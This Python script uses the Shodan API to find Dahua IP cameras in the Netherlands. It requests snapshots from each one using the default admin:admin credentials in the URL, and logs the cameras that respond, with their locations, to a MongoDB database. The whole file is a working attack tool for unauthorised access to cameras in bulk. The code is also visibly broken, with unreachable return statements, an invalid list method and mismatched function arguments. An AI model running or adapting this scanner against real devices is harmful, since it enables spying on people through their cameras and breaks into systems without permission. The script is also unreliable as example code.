import requests
import shodan
from pymongo import MongoClient
from secrets import *

api = shodan.Shodan(SHODAN_API_KEY)
client = MongoClient(mongodb_key)
db = client.addresses


def getaddresses():
    limit = 1
    counter = 0
    iplist = []
    for banner in api.search_cursor('Dahua country:NL'):
        ip = str(banner['ip_str'])
        city = str(banner['location'])
        iplist.append(ip)
        # Keep track of how many results have been downloaded so we don't use up all our query credits
        counter += 1
        if counter >= limit:
            break
    return ip
    return city
    return iplist


def linkbuilder(iplist):
    linklist = []
    for ip in iplist:
        link = 'http://admin:admin@' + ip + '/cgi-bin/snapshot.cgi'
        linklist.append(str(link))
    return linklist


def request(linklist, iplist, city, ip):
    vulnlist = []
    for link in linklist:
        print link
        try:
            response = requests.get(link, verify=False, timeout=3)
            if response.status_code == 200:
                vulnlist.append(iplist[linklist.index(link)])
                addresses = {
                    'number: ': vulnlist.len(),
                    'location: ': city,
                    'ip: ': ip
                }
        except:
            pass
    print addresses
    return vulnlist


print(request(linkbuilder(getaddresses()), getaddresses()))
